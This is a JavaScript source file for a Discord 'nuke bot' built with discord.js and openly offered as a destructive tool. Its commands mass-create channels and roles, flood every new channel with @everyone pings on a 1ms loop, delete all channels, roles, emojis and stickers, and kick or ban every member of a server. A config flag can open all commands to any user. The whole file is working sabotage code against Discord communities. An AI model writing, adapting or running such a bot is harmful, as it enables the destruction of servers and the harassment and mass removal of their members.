/**
 * nuke bot
 * @author fliegenservice
 */
const { Client, Intents, MessageEmbed } = require("discord.js");
const nuker = new Client({ intents: Object.values(Intents.FLAGS).reduce((a, b) => a + b) });
const { red, greenBright, cyan, yellow } = require("chalk");
const { token, prefix, userID, disableEveryone } = require("./config.json")

nuker.on("ready", () => {
    console.clear();
    console.log(red(`
    
                                    
                              ███████╗██╗  ██╗   ██╗████████╗███████╗ █████╗ ███╗   ███╗
                              ██╔════╝██║  ╚██╗ ██╔╝╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
                              █████╗  ██║   ╚████╔╝    ██║   █████╗  ███████║██╔████╔██║
                              ██╔══╝  ██║    ╚██╔╝     ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
                              ██║     ███████╗██║      ██║   ███████╗██║  ██║██║ ╚═╝ ██║
                              ╚═╝     ╚══════╝╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝                                  
                                           
                              

                            
                    Your Nuke-Bot: ${nuker.user.tag}
                    Your Prefix: ${prefix}
    `))
    nuker.user.setActivity({ name: `${prefix}help`, type: "PLAYING" });
});
nuker.on("messageCreate", (message) => {
    const random = message.author
    // Help Embed
    const help = new MessageEmbed()
        .setDescription(`Nuke Commands:
    \n**mass channels:**
    ${prefix}mc [amount] (name) i.e \`${prefix}mc 5 test\`\n
    **mass channel ping:**
    ${prefix}cp [amount] (text), {message} i.e \`${prefix}cp 5 hi, testing\`\n
    **mass roles:**
    ${prefix}mr [amount] (name) i.e \`${prefix}mr 5 test\`\n
    **delete channels:**
    ${prefix}dc\n
    **delete roles:**
    ${prefix}dr\n
    **delete emotes:**
    ${prefix}de\n
    **delete stickers (new):**
    ${prefix}ds\n
    **mass kick:**
    ${prefix}mk\n
    **mass ban:**
    ${prefix}mb
    `)
        .setImage("https://imgur.com/r2dqze9.png")
        .setFooter(`© fliegenservice`)
        .setColor(0x36393E)
        .setTimestamp(Date.now());

    // perms checker
    const channelPerms = message.guild.me.permissions.has("MANAGE_CHANNELS" || "ADMINISTRATOR");
    const banPerms = message.guild.me.permissions.has("BAN_MEMBERS" || "ADMINISTRATOR");
    const kickPerms = message.guild.me.permissions.has("KICK_MEMBERS" || "ADMINISTRATOR");
    const rolePerms = message.guild.me.permissions.has("MANAGE_ROLES" || "ADMINISTRATOR");
    const emotePerms = message.guild.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS" || "ADMINISTRATOR");

    // possible Args lol
    let args = message.content.split(" ").slice(1);
    var args1 = args[0]; 
    var args2 = args.slice(1).join(' ') 
    var args3 = args.slice(2).join(', '); 

    if (!disableEveryone) {
        // help cmd
        if (message.content.startsWith(prefix + "help")) {
            message.channel.send({embeds: [help]})
        }

        // mas channels
        if (message.content.startsWith(prefix + "mc")) {
            MassChannels(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // delete all channels
        if (message.content.startsWith(prefix + "dc")) {
            DelAllChannels().catch((err) => {
                message.reply(err);
            });
        }

        // mas channels and ping
        if (message.content.startsWith(prefix + "cp")) {
            MassChnPing(args1, args2, args3).catch((err) => {
                message.reply(err);
            });
        }

        // mass roles 
        if (message.content.startsWith(prefix + "mr")) {
            MassRoles(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // delete all roles
        if (message.content.startsWith(prefix + "dr")) {
            DelAllRoles().catch((err) => {
                message.reply(err);
            });
        }

        // delete all stickers
        if (message.content.startsWith(prefix + "ds")) {
            DelAllStickers().catch((err) => {
                message.reply(err);
            });
        }

        // delete all emotes
        if (message.content.startsWith(prefix + "de")) {
            DelAllEmotes().catch((err) => {
                message.reply(err);
            });
        }

        // mass Ban
        if (message.content.startsWith(prefix + "mb")) {
            BanAll().catch((err) => {
                message.reply(err);
            });
        }

        // mass Kick
        if (message.content.startsWith(prefix + "mk")) {
            KickAll().catch((err) => {
                message.reply(err);
            });
        }
    } else {
        // help cmd
        if (message.content.startsWith(prefix + "help")) {
            if (message.author.id != userID) return message.reply("no perms");
            message.channel.send({embeds: [help]})
        }

        // mass channels
        if (message.content.startsWith(prefix + "mc")) {
            if (message.author.id != userID) return message.reply("no perms");
            MassChannels(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // delete all channels
        if (message.content.startsWith(prefix + "dc")) {
            if (message.author.id != userID) return message.reply("no perms");
            DelAllChannels().catch((err) => {
                message.reply(err);
            });
        }

        // mass channels and ping
        if (message.content.startsWith(prefix + "cp")) {
            if (message.author.id != userID) return message.reply("no perms");
            MassChnPing(args1, args2, args3).catch((err) => {
                message.reply(err);
            });
        }

        // mass roles
        if (message.content.startsWith(prefix + "mr")) {
            if (message.author.id != userID) return message.reply("no perms");
            MassRoles(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // delete all roles
        if (message.content.startsWith(prefix + "dr")) {
            if (message.author.id != userID) return message.reply("no perms");
            DelAllRoles().catch((err) => {
                message.reply(err);
            });
        }

        // delete all stickers
        if (message.content.startsWith(prefix + "ds")) {
            if (message.author.id != userID) return message.reply("no perms");
            DelAllStickers().catch((err) => {
                message.reply(err);
            });
        }

        // delete all emotes
        if (message.content.startsWith(prefix + "de")) {
            if (message.author.id != userID) return message.reply("no perms");
            DelAllEmotes().catch((err) => {
                message.reply(err);
            });
        }

        // mass ban
        if (message.content.startsWith(prefix + "mb")) {
            if (message.author.id != userID) return message.reply("no perms");
            BanAll().catch((err) => {
                message.reply(err);
            });
        }

        // mass kick
        if (message.content.startsWith(prefix + "mk")) {
            if (message.author.id != userID) return message.reply("no perms");
            KickAll().catch((err) => {
                message.reply(err);
            });
        }
    }


    /**
     * Excessive amount of channels
     * @param {number} amount Amount of channels to mass create
     * @param {string} channelName Name of channel
     */
    function MassChannels(amount, channelName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass channels");
            if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
            if (amount > 500) return reject("Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500");
            if (!channelPerms) return reject("no bot perms:: 'MANAGE_CHANNELS'");
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break; //not more than 500 lol (discord api error)
                if (!channelName) {
                    message.guild.channels.create(`lg von ${message.author.username}`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("error found: " + err)) })
                } else {
                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("error found: " + err)) })
                }
            }
            resolve();
        });
    }

    /**
     * Excessive amount of channels and mentions
     * @param {number} amount Amount of channels to mass create
     * @param {string} channelName Name of channel
     * @param {string} pingMessage Message to be sent when everyone is mentioned
     */
    function MassChnPing(amount, channelName, pingMessage) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Nicht spezifizierte Args: Geben Sie die Anzahl der Massenkanäle an");
            if (isNaN(amount)) return reject("type error: Verwenden Sie eine Zahl für den Betrag");
            if (amount > 500) return reject("amount error: Die maximale guild channel size beträgt 500 | Tipp: Verwenden Sie eine Zahl unter 500");
            if (!channelPerms) return reject("no bot perms:: 'MANAGE_CHANNELS'");
            if (!pingMessage) return reject("Nicht spezifizierte Args: Specify the message you wish to mass mention");
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                if (!channelName) {
                    message.guild.channels.create(`lg von ${message.author.username}`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("error found: " + err)) }).then((ch) => {
                        setInterval(() => {
                            ch.send("@everyone " + pingMessage);
                        }, 1);
                    });
                } else {
                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("error found: " + err)) }).then((ch) => {
                        setInterval(() => {
                            ch.send("@everyone " + pingMessage);
                        }, 1); // literally not possible but lol?
                    });
                }
            }
            resolve();
        });
    }

    /**
     * Deletes all channels in a guild
     */
    function DelAllChannels() {
        return new Promise((resolve, reject) => {
            if (!channelPerms) return reject("no bot perms:: 'MANAGE_CHANNELS'");
            message.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => { console.log(red("error found: " + err)) }))
            resolve()
        });
    }

    /**
     * Excessive amount of roles
     * @param {number} amount Amount of roles
     * @param {string} roleName Role name
     */
    function MassRoles(amount, roleName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Nicht spezifizierte Args: Geben Sie den Betrag für die Massenrollen an");
            if (isNaN(amount)) return reject("type error: Verwenden Sie eine Zahl für den Betrag");
            if (!rolePerms) return reject("no bot perms:: 'MANAGE_ROLES'");
            for (let i = 0; i <= amount; i++) {
                if (message.guild.roles.cache.size === 250) break;
                if (!roleName) {
                    message.guild.roles.create({ name: "nuked", color: "RANDOM", position: i++ }).catch((err) => { console.log(red("error found: " + err)) })
                } else {
                    message.guild.roles.create({ name: roleName, color: "RANDOM", position: i++ }).catch((err) => { console.log(red("error found: " + err)) })
                }
            }
        })
    }

    /**
     * Deletes all roles
     */
    function DelAllRoles() {
        return new Promise((resolve, reject) => {
            if (!rolePerms) return reject("no bot perms:: 'MANAGE_ROLES'");
            message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { console.log(red("error found: " + err)) }))
        });
    }

    /**
     * Deletes all emotes
     */
    function DelAllEmotes() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("no bot perms:: 'MANAGE_EMOJIS_AND_STICKERS'");
            message.guild.emojis.cache.forEach((e) => e.delete().catch((err) => { console.log(red("error found: " + err)) }))
        });
    }

    /**
     * Deletes all stickers
     */
    function DelAllStickers() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("no bot perms:: 'MANAGE_EMOJIS_AND_STICKERS'");
            message.guild.stickers.cache.forEach((s) => s.delete().catch((err) => { console.log(red("error found: " + err)) }))
        });
    }

    /**
     * Ban all guild Members
     */
    function BanAll() {
        return new Promise((resolve, reject) => {
            if (!banPerms) return reject("no bot perms:: 'BAN_MEMBERS'");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
                setTimeout(() => {
                    msg.edit("banning...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.ban().catch((err) => { console.log(red("error found: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} wurde banned : (`)) });
                    }
                }, 2000);
            })
        })
    }

    /**
     * Kick all guild Members
     */
    function KickAll() {
        return new Promise((resolve, reject) => {
            if (!kickPerms) return reject("no bot perms:: 'KICK_MEMBERS'");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
                setTimeout(() => {
                    msg.edit("kicked...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.kick().catch((err) => { console.log(red("error found: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} wurde kicked : (`)) });
                    }
                }, 2000);
            })
        })
    }
});

try {
    nuker.login(token);
} catch (err) {
    console.error(err)
    
}


//.catch(() => null)